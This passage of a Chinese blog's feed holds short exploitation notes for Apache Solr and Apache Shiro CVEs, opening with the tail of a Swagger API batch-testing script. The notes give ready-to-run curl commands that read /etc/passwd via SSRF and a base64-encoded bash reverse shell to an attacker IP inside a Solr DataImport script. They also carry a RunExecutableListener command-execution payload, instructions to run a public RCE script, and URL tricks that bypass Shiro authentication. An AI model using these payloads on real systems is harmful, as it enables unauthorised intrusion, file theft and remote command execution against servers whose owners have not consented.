class="string">&quot;[!] Error&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">elif</span> url_type == <span class="number">1</span>:</span><br><span class="line">        logger.success(<span class="string">&quot;working on &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url) ,<span class="string">&quot;type: source&quot;</span>)</span><br><span class="line">        go_source(url,q)</span><br><span class="line">    <span class="keyword">elif</span> url_type == <span class="number">2</span>:</span><br><span class="line">        logger.success(<span class="string">&quot;working on &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url) ,<span class="string">&quot;type: api-docs&quot;</span>)</span><br><span class="line">        go_docs(url,q)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logger.success(<span class="string">&quot;working on &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url) ,<span class="string">&quot;type: html&quot;</span>)</span><br><span class="line">        go_html(url,q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_error</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;进程池出错,出错原因为: &quot;</span>, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_pool</span>(<span class="params">urls</span>):</span><br><span class="line">    p = Pool(<span class="number">8</span>)</span><br><span class="line">    manager = Manager()</span><br><span class="line">    q = manager.Queue()</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        url = url.strip()</span><br><span class="line">        param = [url,q]</span><br><span class="line">        p.apply_async(run,args=(param,),error_callback=print_error)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join() </span><br><span class="line">    output_to_csv(q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">output_to_csv</span>(<span class="params">global_data</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;swagger.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#写到csv中</span></span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        writer.writerow([<span class="string">&quot;api-doc-url&quot;</span>,<span class="string">&quot;summary&quot;</span>,<span class="string">&quot;path&quot;</span>,<span class="string">&quot;method&quot;</span>,<span class="string">&quot;query_url&quot;</span>,<span class="string">&quot;num of params&quot;</span>,<span class="string">&quot;data&quot;</span>,<span class="string">&quot;status_code&quot;</span>,<span class="string">&quot;response&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> global_data.empty():</span><br><span class="line">        writer.writerow(global_data.get())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&#x27;target_url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;resource地址 or api文档地址 or swagger首页地址&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, dest=<span class="string">&#x27;url_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;批量测试&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    logger.add(<span class="string">&quot;file.log&quot;</span>, <span class="built_in">format</span>=<span class="string">&quot;&#123;time:YYYY-MM-DD at HH:mm:ss&#125; | &#123;level&#125; | &#123;message&#125;&quot;</span>)</span><br><span class="line">    banner()</span><br><span class="line">    <span class="keyword">if</span> args.target_url:</span><br><span class="line">        run_pool([args.target_url])</span><br><span class="line">    <span class="keyword">elif</span> args.url_file:</span><br><span class="line">        f = <span class="built_in">open</span>(args.url_file, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        urls = f.readlines()</span><br><span class="line">        run_pool(urls)</span><br></pre></td></tr></table></figure><h2 id="测试单个Swagger中的所有API接口"><a href="#测试单个Swagger中的所有API接口" class="headerlink" title="测试单个Swagger中的所有API接口"></a>测试单个Swagger中的所有API接口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 swagger-hack2.0.py -u http://example.com/swagger/doc.json</span><br></pre></td></tr></table></figure><h2 id="测试多个Swagger中的所有API接口"><a href="#测试多个Swagger中的所有API接口" class="headerlink" title="测试多个Swagger中的所有API接口"></a>测试多个Swagger中的所有API接口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 swagger-hack2.0.py -f &lt;file&gt;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;批量测试Swagger中出现的API接口&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】CVE-2021-27905漏洞利用</title>
    <link href="https://loli.fj.cn/2024/06/27/CVE-2021-27905%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/06/27/CVE-2021-27905%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-27T09:57:51.000Z</published>
    <updated>2024-07-01T10:30:29.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java的Solr框架利用SSRF实现任意文件读取漏洞利用</p><span id="more"></span><h2 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://&lt;ip&gt;:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><blockquote><p><code>&lt;database&gt;</code>：上一步获取的数据库名</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k -X $&#x27;POST&#x27; -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; $&#x27;http://&lt;ip&gt;:8983/solr/&lt;database&gt;/config&#x27;</span><br></pre></td></tr></table></figure><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><blockquote><p><code>/etc/passwd</code>：读取文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k &#x27;http://&lt;ip&gt;:8983/solr/&lt;database&gt;/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Java的Solr框架利用SSRF实现任意文件读取漏洞利用&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://loli.fj.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】CVE-2019-0193漏洞利用</title>
    <link href="https://loli.fj.cn/2024/06/27/CVE-2019-0193%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/06/27/CVE-2019-0193%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-27T09:47:41.000Z</published>
    <updated>2024-07-01T10:30:29.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java的Solr框架远程命令执行漏洞利用</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Apache Solr &lt; 8.2.0</li><li>能进入Solr管理页面</li></ul><h2 id="攻击者监听反弹Shell"><a href="#攻击者监听反弹Shell" class="headerlink" title="攻击者监听反弹Shell"></a>攻击者监听反弹Shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;port&gt;</span><br></pre></td></tr></table></figure><h2 id="将反弹Shell的命令进行Base64编码"><a href="#将反弹Shell的命令进行Base64编码" class="headerlink" title="将反弹Shell的命令进行Base64编码"></a>将反弹Shell的命令进行Base64编码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&quot; | base64</span><br></pre></td></tr></table></figure><h2 id="受害者反弹Shell"><a href="#受害者反弹Shell" class="headerlink" title="受害者反弹Shell"></a>受害者反弹Shell</h2><ul><li><p>访问<a href="http://localhost:8983/solr">http://localhost:8983/solr</a>进入Solr管理页面</p></li><li><p>选择一个核心-&gt;<code>DataImport</code>-&gt;勾选<code>Debug</code>-&gt;展开<code>Configuration</code>-&gt;选择<code>Debug-Mode</code>-&gt;修改xml配置-&gt;<code>Execute with this Configuration</code></p></li></ul><blockquote><p><code>&lt;base64&gt;</code>：上一步Base64编码后的反弹Shell命令</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;URLDataSource&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&lt;![CDATA[function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,&lt;base64&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);&#125;]]&gt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">&quot;stackoverflow&quot;</span> <span class="attr">url</span>=<span class="string">&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span> <span class="attr">processor</span>=<span class="string">&quot;XPathEntityProcessor&quot;</span> <span class="attr">forEach</span>=<span class="string">&quot;/feed&quot;</span> <span class="attr">transformer</span>=<span class="string">&quot;script:poc&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/20240627094741/01.webp"></p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Java的Solr框架远程命令执行漏洞利用&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://loli.fj.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】CVE-2019-17558漏洞利用</title>
    <link href="https://loli.fj.cn/2024/06/26/CVE-2019-17558%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/06/26/CVE-2019-17558%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-26T16:45:32.000Z</published>
    <updated>2024-07-01T10:30:29.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过<a href="/302.html?target=https://github.com/jas502n/solr_rce">jas502n&#x2F;solr_rce</a>实现Java的Solr框架远程命令执行漏洞利用<br>Solr默认端口号为8983</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Apache Solr &gt;&#x3D; 5.0.0 &lt;&#x3D; 8.3.1</li></ul><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jas502n/solr_rce.git</span><br><span class="line">cd solr_rce</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><code>&lt;ip&gt;</code>：受害者IP地址<br><code>&lt;shell&gt;</code>：远程执行的Shell命令</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 solr_rce.py http://&lt;ip&gt;:8983 &lt;shell&gt;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;通过&lt;a href=&quot;/302.html?target=https://github.com/jas502n/solr_rce&quot;&gt;jas502n&amp;#x2F;solr_rce&lt;/a&gt;实现Java的Solr框架远程命令执行漏洞利用&lt;br&gt;Solr默认端口号为8983&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://loli.fj.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】CVE-2017-12629漏洞利用</title>
    <link href="https://loli.fj.cn/2024/06/26/CVE-2017-12629%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/06/26/CVE-2017-12629%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-26T16:36:38.000Z</published>
    <updated>2024-07-01T10:30:29.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java的Solr框架远程命令执行漏洞利用<br>Solr默认端口号为8983</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Apache Solr &lt; 7.1.0</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://example.com/solr/admin/config</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;x&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;,&quot;&lt;shell&gt;&quot;]&#125;</span><br></pre></td></tr></table></figure><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http://example.com/solr/admin/update</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">[&#123;&quot;x&quot;,&quot;x&quot;&#125;]</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Java的Solr框架远程命令执行漏洞利用&lt;br&gt;Solr默认端口号为8983&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://loli.fj.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】CVE-2020-1957漏洞利用</title>
    <link href="https://loli.fj.cn/2024/06/26/CVE-2020-1957%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://loli.fj.cn/2024/06/26/CVE-2020-1957%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2024-06-26T15:41:42.000Z</published>
    <updated>2024-07-01T10:30:29.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java的Shiro框架未授权访问漏洞利用</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Apache Shiro &lt; 1.5.3</li></ul><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><ul><li>如果能正常访问<code>/login</code>，则可以通过<code>/;/login</code>测试是否依然可以显示</li><li>如果可以正常显示，说明存在漏洞；如果显示报错页面，说明不存在漏洞</li></ul><figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://example.com/;/login</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>通过<code>/;/admin</code>绕过Shiro直接进入管理员页面</li></ul><figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://example.com/;/admin</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Java的Shiro框架未授权访问漏洞利用&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://loli.fj.cn/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】CVE-2020-11989漏洞检测</title>
    <link href="https://loli.fj.cn/2024/06/26/CVE-2020-11989%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
    <id>https://loli.fj.cn/2024/06/26/CVE-2020-11989%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</id>
    <published>2024-06-26T15:27:36.000Z</published>
    <updated>2024-07-01T10:30:29.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java的Shiro框架漏洞检测</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Apache Shiro &lt; 1.7.1</li></ul><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://example.com/admin/%20</span><br></pre></td></tr></table></figure><ul><li>如果可以绕过Shiro直接进入管理员页面，说明存在漏洞</li></ul><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Java的Shiro框架漏洞检测&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://loli.fj.cn/tags/Java/"/>
    
  </entry>
  
</feed>
